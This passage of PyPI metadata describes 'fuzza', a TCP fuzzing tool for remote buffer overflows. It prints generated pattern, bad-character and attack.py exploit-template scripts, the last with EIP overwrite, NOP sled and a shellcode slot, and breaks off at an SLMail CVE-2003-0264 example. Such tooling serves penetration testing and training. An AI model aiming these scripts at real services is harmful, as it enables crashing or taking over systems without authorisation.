The author accepts no liability for damage caused by this tool. If these terms are not acceptable to you, then do not use this tool.\n\n\n## License\n\n**[MIT License](LICENSE.txt)**\n\nCopyright (c) 2020 **[cytopia](https://github.com/cytopia)**\n\n\n", "description_content_type": "text/markdown", "docs_url": null, "download_url": "", "downloads": {"last_day": -1, "last_month": -1, "last_week": -1}, "home_page": "https://github.com/cytopia/fuzza", "keywords": "", "license": "MIT", "maintainer": "", "maintainer_email": "", "name": "fuzza", "package_url": "https://pypi.org/project/fuzza/", "platform": "", "project_url": "https://pypi.org/project/fuzza/", "project_urls": {"Homepage": "https://github.com/cytopia/fuzza"}, "release_url": "https://pypi.org/project/fuzza/0.6.0/", "requires_dist": ["argparse", "future"], "requires_python": "", "summary": "Customizable TCP fuzzing tool to test for remote buffer overflows.", "version": "0.6.0", "yanked": false, "html_description": "<div class=\"project-description\">\n            <h1>fuzza</h1>\n<p><a href=\"https://github.com/psf/black\" rel=\"nofollow\"><img alt=\"\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/fbfdc7754183ecf079bc71ddeabaf88f6cbc5c00/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f636f64652532307374796c652d626c61636b2d3030303030302e737667\"></a>\n<a href=\"https://pypi.org/project/fuzza/\" rel=\"nofollow\"><img alt=\"PyPI\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/575bd9e6964320e4b1e2692ac1ca701d21f741b4/68747470733a2f2f696d672e736869656c64732e696f2f707970692f762f66757a7a61\"></a>\n<a href=\"https://pypi.org/project/fuzza/\" rel=\"nofollow\"><img alt=\"PyPI - Status\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/5e7884005efaf4d8a1df72343a59865651dc38b7/68747470733a2f2f696d672e736869656c64732e696f2f707970692f7374617475732f66757a7a61\"></a>\n<a href=\"https://pypi.org/project/fuzza/\" rel=\"nofollow\"><img alt=\"PyPI - Python Version\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/4557dbdbc38f90861513f00f8bdd9f6988f63ddc/68747470733a2f2f696d672e736869656c64732e696f2f707970692f707976657273696f6e732f66757a7a61\"></a>\n<a href=\"https://pypi.org/project/fuzza/\" rel=\"nofollow\"><img alt=\"PyPI - Format\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/b64c77b9e7553b1321e5301135ec447885f6e3d2/68747470733a2f2f696d672e736869656c64732e696f2f707970692f666f726d61742f66757a7a61\"></a>\n<a href=\"https://pypi.org/project/fuzza/\" rel=\"nofollow\"><img alt=\"PyPI - Implementation\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/44c4ce975930d3c0d1d843bd744b1979bfc770bf/68747470733a2f2f696d672e736869656c64732e696f2f707970692f696d706c656d656e746174696f6e2f66757a7a61\"></a>\n<a href=\"https://pypi.org/project/fuzza/\" rel=\"nofollow\"><img alt=\"PyPI - License\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/e8aca96d920888d3f280e9372bd6f6abb9b4956a/68747470733a2f2f696d672e736869656c64732e696f2f707970692f6c2f66757a7a61\"></a></p>\n<p><a href=\"https://github.com/cytopia/fuzza/actions?workflow=linting\" rel=\"nofollow\"><img alt=\"Build Status\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/52b8dd329cef131ddb711cbcdf271e8b3148b8ef/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f66757a7a612f776f726b666c6f77732f6c696e74696e672f62616467652e737667\"></a>\n<a href=\"https://github.com/cytopia/fuzza/actions?workflow=testing\" rel=\"nofollow\"><img alt=\"Build Status\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/b7a2a454c6dc88299436f8218f398eaa7bf01b8c/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f66757a7a612f776f726b666c6f77732f74657374696e672f62616467652e737667\"></a>\n<a href=\"https://github.com/cytopia/fuzza/actions?workflow=building\" rel=\"nofollow\"><img alt=\"Build Status\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/d3c39db4529488172bd60726848360238a310c19/68747470733a2f2f6769746875622e636f6d2f6379746f7069612f66757a7a612f776f726b666c6f77732f6275696c64696e672f62616467652e737667\"></a></p>\n<p>Customizable TCP fuzzing tool to test for remote buffer overflows.</p>\n<p><code>fuzza</code> is able to send and receive any initial commands prior sending the payload as well as\nsending any post commands after the payload has been sent. In order to replicate and triage the\nbuffer overflow, <code>fuzza</code> can be used to generate custom python scripts for attack, badchars and\nfinding the eip based on your command line arguments. See examples for more details.</p>\n<h2>Features</h2>\n<ul>\n<li>Works similar to <a href=\"https://www.codeproject.com/articles/19307/generic-tcp-ip-client-server\" rel=\"nofollow\">generic_send_tcp</a>, but instructions are specified via command line arguments</li>\n<li>Has an <a href=\"https://linux.die.net/man/1/expect\" rel=\"nofollow\">expect</a>-like feature to wait for a specific response which also supports regex</li>\n<li>Generates custom Python scripts based on your command line arguments to triage the overflow</li>\n<li>Works with Python2 and Python3</li>\n</ul>\n<h2>Installation</h2>\n<pre>pip install fuzza\n</pre>\n<h2>Usage</h2>\n<pre>$ fuzza --help\n\nusage: fuzza <span class=\"o\">[</span>options<span class=\"o\">]</span> host port\n       fuzza --help\n       fuzza --version\n\nCustomizable TCP fuzzing tool to <span class=\"nb\">test</span> <span class=\"k\">for</span> remote buffer overflows.\n\nIt works in two different modes: normal and generate. Normal mode will send your payload\nto a remote endpoint and increase the payload size each round in order to try to crash the\nservice. The generate mode however will generate three easy to use python scripts to\nfurther triage any potential buffer overflow manually.\n\npositional arguments:\n  host                  IP or hostname to connect to.\n  port                  Port to connect to.\n\noptional arguments:\n  -h, --help            show this <span class=\"nb\">help</span> message and <span class=\"nb\">exit</span>\n  -v, --version         Show version information,\n  -c char, --char char  Buffer character to send as payload. Default: <span class=\"s2\">\"A\"</span>\n  -p str, --prefix str  Prefix string to prepend to buffer. Empty by default.\n  -s str, --suffix str  Suffix string to append to buffer. Empty by default.\n  -l int, --length int  Initial length to concat buffer string with x*char.\n                        When using the <span class=\"s1\">'-g'</span> option to generate reproducible attack scripts <span class=\"nb\">set</span> this\n                        to the value at which the crash occured in order to pre-populate the\n                        generated scripts. Default: <span class=\"m\">100</span>\n  -m int, --multiply int\n                        Round multiplier to concat buffer string with x*char every round.\n                        Default: <span class=\"m\">100</span>\n  -i str, --init str    If specified, initializes communication before sending the payload in the\n                        form <span class=\"s1\">'&lt;send&gt;:&lt;expect&gt;,&lt;send&gt;:&lt;expect&gt;,...'</span>. Where &lt;send&gt; is the data to be\n                        sent to the server and &lt;expect&gt; is the answer to be received from the\n                        server.  Either one of &lt;send&gt; or &lt;expect&gt; can be omitted <span class=\"k\">if</span> you expect\n                        something without having sent data yet or need to send something <span class=\"k\">for</span> which\n                        there will not be an answer. Multiple &lt;send&gt;:&lt;expect&gt; are supported and\n                        must be separated by a comma.\n                        Regex supported <span class=\"k\">for</span> &lt;expect&gt; part.\n  -e str, --exit str    If specified, finalizes communication after sending the payload in the\n                        form <span class=\"s1\">'&lt;send&gt;:&lt;expect&gt;,&lt;send&gt;:&lt;expect&gt;,...'</span>. Where &lt;send&gt; is the data to be\n                        sent to the server and &lt;expect&gt; is the answer to be received from the\n                        server.  Either one of &lt;send&gt; or &lt;expect&gt; can be omitted <span class=\"k\">if</span> you expect\n                        something without having sent data yet or need to send something <span class=\"k\">for</span>\n                        which there will not be an answer. Multiple &lt;send&gt;:&lt;expect&gt; are supported\n                        and must be separated by a comma.\n                        Regex supported <span class=\"k\">for</span> &lt;expect&gt; part.\n  -t float, --timeout float\n                        Timeout in sec <span class=\"k\">for</span> receiving data before declaring the endpoint as crashed.\n                        Default: <span class=\"m\">30</span>.0\n  -d float, --delay float\n                        Delay in seconds between each round. Default: <span class=\"m\">1</span>.0\n  -g dir, --generate dir\n                        Generate custom python scripts based on your <span class=\"nb\">command</span> line arguments\n                        to reproduce and triage the overflow. Requires a directory to be\n                        specified where to save the scripts to.\n\nexample:\n\n  The following example illustrates how to use the initial communication by:\n      <span class=\"m\">1</span>. Expecting the POP3 server banner\n      <span class=\"m\">2</span>. Sending <span class=\"s1\">'USER bob'</span>\n      <span class=\"m\">3</span>. Expecting a welcome message\n  Additionally before sending the fuzzing characters, it is prepended with <span class=\"s1\">'PASS '</span>,\n  so that the actuall fuzzing can be <span class=\"k\">done</span> on the password:\n     <span class=\"m\">1</span>. Prefix payload with <span class=\"s1\">'PASS '</span>\n     <span class=\"m\">2</span>. Send payload\n  Lastly in order to also close the connection the <span class=\"s1\">'-e'</span> opton is used\n  <span class=\"o\">(</span>which works exactly as <span class=\"s1\">'-i'</span><span class=\"o\">)</span> in order to send data after the payload.\n     <span class=\"m\">1</span>. Expect any response from password payload\n     <span class=\"m\">2</span>. Terminate the connection via QUIT\n     <span class=\"m\">3</span>. Do not expect a follow up response\n  $ fuzza -i <span class=\"s1\">':.*POP3.*,USER bob\\r\\n:.*welcome.*'</span> -e <span class=\"s1\">':.*,QUIT:'</span> -p <span class=\"s1\">'PASS '</span> -s <span class=\"s1\">'\\r\\n'</span>\n\nVisit https://github.com/cytopia/fuzza <span class=\"k\">for</span> more examples.\n</pre>\n<h2>Modes</h2>\n<h3>Normal</h3>\n<p>In normal mode you can communicate with a network service and specify at which stage of the\ncommunication to send an increasing buffer.</p>\n<p>The following example sends an ever increasing buffer to host.example.tld at port 4444:</p>\n<pre>$ fuzza host.example.tld <span class=\"m\">4444</span>\n</pre>\n<p>The following example connects to an IMAP service, waits for its banner and tries to overflow\nthe password value of <code>a LOGIN &lt;user&gt; &lt;pass&gt;</code>:</p>\n<pre>$ fuzza -i <span class=\"s1\">':.*'</span> -p <span class=\"s1\">'a LOGIN bob '</span> -s <span class=\"s1\">'\\r\\n'</span> host.example.tld <span class=\"m\">143</span>\n</pre>\n<h3>Generate</h3>\n<p>If you have found a potential buffer overflow, it is time to generate your triage scripts with the\nsame parameter used for finding the overflow.</p>\n<p>In the following example you have found a buffer overflow on host.example.tld at port 4444 at\n300 characters and can start to generate your files:</p>\n<pre>$ fuzza host.example.tld <span class=\"m\">4444</span> -l <span class=\"m\">300</span> -g output/\n</pre>\n<p>The scripts will be pre-populated with any command line arguments specified.</p>\n<h4><code>pattern.py</code></h4>\n<p>This is the first script you will want to use. It is already pre-populated with characters from\n<code>pattern_create.rb</code> at length 300. There is no modification required. Simply start your debugger\nof choice, watch your application and run <code>pattern.py</code> without any arguments. Whatever ends up in\nyour EIP can be thrown into <code>pattern_offset.rb</code> and you have the length of the overflow.</p>\n<pre><span class=\"ch\">#!/usr/bin/env python</span>\n<span class=\"sd\">\"\"\"fuzza autogenerated.\"\"\"</span>\n\n<span class=\"kn\">from</span> <span class=\"nn\">__future__</span> <span class=\"kn\">import</span> <span class=\"n\">print_function</span>\n<span class=\"kn\">import</span> <span class=\"nn\">socket</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">str2b</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">):</span>\n    <span class=\"sd\">\"\"\"Unescape P2/P3 and convert to bytes if Python3.\"\"\"</span>\n    <span class=\"c1\"># Python2: Unescape control chars</span>\n    <span class=\"k\">try</span><span class=\"p\">:</span>\n        <span class=\"k\">return</span> <span class=\"n\">data</span><span class=\"o\">.</span><span class=\"n\">decode</span><span class=\"p\">(</span><span class=\"s1\">'string_escape'</span><span class=\"p\">)</span>\n    <span class=\"k\">except</span> <span class=\"ne\">AttributeError</span><span class=\"p\">:</span>\n        <span class=\"k\">pass</span>\n    <span class=\"k\">except</span> <span class=\"ne\">UnicodeDecodeError</span><span class=\"p\">:</span>\n        <span class=\"k\">pass</span>\n    <span class=\"c1\"># Python3: Unescape control chars and convert to byte</span>\n    <span class=\"k\">try</span><span class=\"p\">:</span>\n        <span class=\"k\">return</span> <span class=\"n\">data</span><span class=\"o\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s2\">\"utf-8\"</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">decode</span><span class=\"p\">(</span><span class=\"s1\">'unicode-escape'</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s2\">\"latin1\"</span><span class=\"p\">)</span>\n    <span class=\"k\">except</span> <span class=\"ne\">UnicodeDecodeError</span><span class=\"p\">:</span>\n        <span class=\"k\">pass</span>\n\n<span class=\"n\">s</span> <span class=\"o\">=</span> <span class=\"n\">socket</span><span class=\"o\">.</span><span class=\"n\">socket</span><span class=\"p\">(</span><span class=\"n\">socket</span><span class=\"o\">.</span><span class=\"n\">AF_INET</span><span class=\"p\">,</span> <span class=\"n\">socket</span><span class=\"o\">.</span><span class=\"n\">SOCK_STREAM</span><span class=\"p\">)</span>\n\n<span class=\"n\">pattern</span> <span class=\"o\">=</span> <span class=\"p\">(</span>\n    <span class=\"s2\">\"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9\"</span>\n    <span class=\"s2\">\"Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9\"</span>\n    <span class=\"s2\">\"Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9\"</span>\n    <span class=\"s2\">\"Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9\"</span>\n<span class=\"p\">)</span>  <span class=\"c1\"># 300 bytes from pattern_create.rb</span>\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'Trying to send </span><span class=\"si\">%s</span><span class=\"s1\"> bytes unique chars...'</span> <span class=\"o\">%</span> <span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">pattern</span><span class=\"p\">))))</span>\n<span class=\"k\">try</span><span class=\"p\">:</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">connect</span><span class=\"p\">((</span><span class=\"s1\">'host.example.tld'</span><span class=\"p\">,</span> <span class=\"mi\">4444</span><span class=\"p\">))</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">send</span><span class=\"p\">(</span><span class=\"n\">str2b</span><span class=\"p\">(</span><span class=\"s1\">''</span> <span class=\"o\">+</span> <span class=\"n\">pattern</span> <span class=\"o\">+</span> <span class=\"s1\">''</span><span class=\"p\">))</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'done'</span><span class=\"p\">)</span>\n<span class=\"k\">except</span><span class=\"p\">:</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'Could not connect'</span><span class=\"p\">)</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">close</span><span class=\"p\">()</span>\n</pre>\n<p>Next thing you will want to do is to adjust the <code>len_overflow</code> variable in <code>badchars.py</code> and\n<code>attack.py</code> with the value you found via <code>pattern_offset.rb</code></p>\n<h4><code>badchars.py</code></h4>\n<p>This script will help you to identify any characters that are squashed or truncated in memory, ie.\nthe bad characters that cannot be used for the payload.</p>\n<p>Before running it, remember to adjust the <code>len_overflow</code> variable.</p>\n<pre><span class=\"ch\">#!/usr/bin/env python</span>\n<span class=\"sd\">\"\"\"fuzza autogenerated.\"\"\"</span>\n\n<span class=\"kn\">from</span> <span class=\"nn\">__future__</span> <span class=\"kn\">import</span> <span class=\"n\">print_function</span>\n<span class=\"kn\">import</span> <span class=\"nn\">socket</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">str2b</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">):</span>\n    <span class=\"sd\">\"\"\"Unescape P2/P3 and convert to bytes if Python3.\"\"\"</span>\n    <span class=\"c1\"># Python2: Unescape control chars</span>\n    <span class=\"k\">try</span><span class=\"p\">:</span>\n        <span class=\"k\">return</span> <span class=\"n\">data</span><span class=\"o\">.</span><span class=\"n\">decode</span><span class=\"p\">(</span><span class=\"s1\">'string_escape'</span><span class=\"p\">)</span>\n    <span class=\"k\">except</span> <span class=\"ne\">AttributeError</span><span class=\"p\">:</span>\n        <span class=\"k\">pass</span>\n    <span class=\"k\">except</span> <span class=\"ne\">UnicodeDecodeError</span><span class=\"p\">:</span>\n        <span class=\"k\">pass</span>\n    <span class=\"c1\"># Python3: Unescape control chars and convert to byte</span>\n    <span class=\"k\">try</span><span class=\"p\">:</span>\n        <span class=\"k\">return</span> <span class=\"n\">data</span><span class=\"o\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s2\">\"utf-8\"</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">decode</span><span class=\"p\">(</span><span class=\"s1\">'unicode-escape'</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s2\">\"latin1\"</span><span class=\"p\">)</span>\n    <span class=\"k\">except</span> <span class=\"ne\">UnicodeDecodeError</span><span class=\"p\">:</span>\n        <span class=\"k\">pass</span>\n\n<span class=\"n\">s</span> <span class=\"o\">=</span> <span class=\"n\">socket</span><span class=\"o\">.</span><span class=\"n\">socket</span><span class=\"p\">(</span><span class=\"n\">socket</span><span class=\"o\">.</span><span class=\"n\">AF_INET</span><span class=\"p\">,</span> <span class=\"n\">socket</span><span class=\"o\">.</span><span class=\"n\">SOCK_STREAM</span><span class=\"p\">)</span>\n\n<span class=\"n\">len_overflow</span> <span class=\"o\">=</span> <span class=\"mi\">300</span>      <span class=\"c1\"># Use pattern_create.rb and pattern_offset.rb to find exact offset</span>\n<span class=\"n\">eip</span>          <span class=\"o\">=</span> <span class=\"s2\">\"B\"</span><span class=\"o\">*</span><span class=\"mi\">4</span>     <span class=\"c1\"># Ignore for badchar detection</span>\n<span class=\"n\">badchars</span> <span class=\"o\">=</span> <span class=\"p\">(</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0</span><span class=\"s2\">\"</span>\n    <span class=\"s2\">\"</span><span class=\"se\">\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff</span><span class=\"s2\">\"</span>\n<span class=\"p\">)</span>\n\n<span class=\"n\">buffer</span> <span class=\"o\">=</span> <span class=\"s2\">\"A\"</span><span class=\"o\">*</span><span class=\"n\">len_overflow</span> <span class=\"o\">+</span> <span class=\"n\">eip</span> <span class=\"o\">+</span> <span class=\"n\">badchars</span>\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'Trying to send </span><span class=\"si\">%s</span><span class=\"s1\"> bytes buffer...'</span> <span class=\"o\">%</span> <span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">buffer</span><span class=\"p\">))))</span>\n<span class=\"k\">try</span><span class=\"p\">:</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">connect</span><span class=\"p\">((</span><span class=\"s1\">'host.example.tld'</span><span class=\"p\">,</span> <span class=\"mi\">4444</span><span class=\"p\">))</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">send</span><span class=\"p\">(</span><span class=\"n\">str2b</span><span class=\"p\">(</span><span class=\"s1\">''</span> <span class=\"o\">+</span> <span class=\"n\">buffer</span> <span class=\"o\">+</span> <span class=\"s1\">''</span><span class=\"p\">))</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'done'</span><span class=\"p\">)</span>\n<span class=\"k\">except</span><span class=\"p\">:</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'Could not connect'</span><span class=\"p\">)</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">close</span><span class=\"p\">()</span>\n</pre>\n<h4><code>attack.py</code></h4>\n<p>In this script everything comes together and you can:</p>\n<ol>\n<li>Adjust the overflow length</li>\n<li>Adjust the nop sled length</li>\n<li>Set EIP address</li>\n<li>Add shellcode</li>\n<li>Add padding</li>\n</ol>\n<p>There is also not much to write, as you just need to fill variables and most other stuff is simply\nauto-calculated.</p>\n<pre><span class=\"ch\">#!/usr/bin/env python</span>\n<span class=\"sd\">\"\"\"fuzza autogenerated.\"\"\"</span>\n\n<span class=\"kn\">from</span> <span class=\"nn\">__future__</span> <span class=\"kn\">import</span> <span class=\"n\">print_function</span>\n<span class=\"kn\">import</span> <span class=\"nn\">socket</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">str2b</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">):</span>\n    <span class=\"sd\">\"\"\"Unescape P2/P3 and convert to bytes if Python3.\"\"\"</span>\n    <span class=\"c1\"># Python2: Unescape control chars</span>\n    <span class=\"k\">try</span><span class=\"p\">:</span>\n        <span class=\"k\">return</span> <span class=\"n\">data</span><span class=\"o\">.</span><span class=\"n\">decode</span><span class=\"p\">(</span><span class=\"s1\">'string_escape'</span><span class=\"p\">)</span>\n    <span class=\"k\">except</span> <span class=\"ne\">AttributeError</span><span class=\"p\">:</span>\n        <span class=\"k\">pass</span>\n    <span class=\"k\">except</span> <span class=\"ne\">UnicodeDecodeError</span><span class=\"p\">:</span>\n        <span class=\"k\">pass</span>\n    <span class=\"c1\"># Python3: Unescape control chars and convert to byte</span>\n    <span class=\"k\">try</span><span class=\"p\">:</span>\n        <span class=\"k\">return</span> <span class=\"n\">data</span><span class=\"o\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s2\">\"utf-8\"</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">decode</span><span class=\"p\">(</span><span class=\"s1\">'unicode-escape'</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s2\">\"latin1\"</span><span class=\"p\">)</span>\n    <span class=\"k\">except</span> <span class=\"ne\">UnicodeDecodeError</span><span class=\"p\">:</span>\n        <span class=\"k\">pass</span>\n\n<span class=\"n\">s</span> <span class=\"o\">=</span> <span class=\"n\">socket</span><span class=\"o\">.</span><span class=\"n\">socket</span><span class=\"p\">(</span><span class=\"n\">socket</span><span class=\"o\">.</span><span class=\"n\">AF_INET</span><span class=\"p\">,</span> <span class=\"n\">socket</span><span class=\"o\">.</span><span class=\"n\">SOCK_STREAM</span><span class=\"p\">)</span>\n\n<span class=\"n\">len_total</span>    <span class=\"o\">=</span> <span class=\"mi\">300</span>                <span class=\"c1\"># Start at len_overflow and try out how much can be overwritten</span>\n<span class=\"n\">len_overflow</span> <span class=\"o\">=</span> <span class=\"mi\">296</span>                <span class=\"c1\"># Use pattern_create.rb and pattern_offset.rb to find exact offset</span>\n<span class=\"n\">len_nop_sled</span> <span class=\"o\">=</span> <span class=\"mi\">0</span>                   <span class=\"c1\"># Add x bytes of nops before shellcode for shellcode decoding</span>\n<span class=\"n\">eip</span>          <span class=\"o\">=</span> <span class=\"s2\">\"</span><span class=\"se\">\\x42\\x42\\x42\\x42</span><span class=\"s2\">\"</span>  <span class=\"c1\"># Change this (Keep in mind to put address in reverse order)</span>\n<span class=\"n\">shellcode</span>    <span class=\"o\">=</span> <span class=\"s2\">\"\"</span>\n\n<span class=\"n\">padding</span> <span class=\"o\">=</span> <span class=\"s2\">\"C\"</span><span class=\"o\">*</span><span class=\"p\">(</span><span class=\"n\">len_total</span> <span class=\"o\">-</span> <span class=\"n\">len_overflow</span> <span class=\"o\">-</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"n\">eip</span><span class=\"p\">))</span> <span class=\"o\">-</span> <span class=\"n\">len_nop_sled</span> <span class=\"o\">-</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">shellcode</span><span class=\"p\">))</span>\n<span class=\"n\">buffer</span>  <span class=\"o\">=</span> <span class=\"s2\">\"A\"</span><span class=\"o\">*</span><span class=\"n\">len_overflow</span> <span class=\"o\">+</span> <span class=\"n\">eip</span> <span class=\"o\">+</span> <span class=\"s2\">\"</span><span class=\"se\">\\x90</span><span class=\"s2\">\"</span><span class=\"o\">*</span><span class=\"n\">len_nop_sled</span> <span class=\"o\">+</span> <span class=\"n\">shellcode</span> <span class=\"o\">+</span> <span class=\"n\">padding</span>\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'Trying to send </span><span class=\"si\">%s</span><span class=\"s1\"> bytes buffer...'</span> <span class=\"o\">%</span> <span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">buffer</span><span class=\"p\">))))</span>\n<span class=\"k\">try</span><span class=\"p\">:</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">connect</span><span class=\"p\">((</span><span class=\"s1\">'host.example.tld'</span><span class=\"p\">,</span> <span class=\"mi\">4444</span><span class=\"p\">))</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">send</span><span class=\"p\">(</span><span class=\"n\">str2b</span><span class=\"p\">(</span><span class=\"s1\">''</span> <span class=\"o\">+</span> <span class=\"n\">buffer</span> <span class=\"o\">+</span> <span class=\"s1\">''</span><span class=\"p\">))</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'done'</span><span class=\"p\">)</span>\n<span class=\"k\">except</span><span class=\"p\">:</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'Could not connect'</span><span class=\"p\">)</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">close</span><span class=\"p\">()</span>\n</pre>\n<h2>Examples</h2>\n<h3>SLMail 5.5 Buffer overflow</h3>\n<h4>Overview</h4>\n<ul>\n<li><a href=\"https://www.cvedetails.com/cve/CVE-2003-0264/\" rel=\"nofollow\">CVE-2003-0264</a> - buffer overflow in password.</li>\n</ul>\n<p>To see how the raw communication works, have a look at the following netcat snippet:</p>\n<pre>$ nc 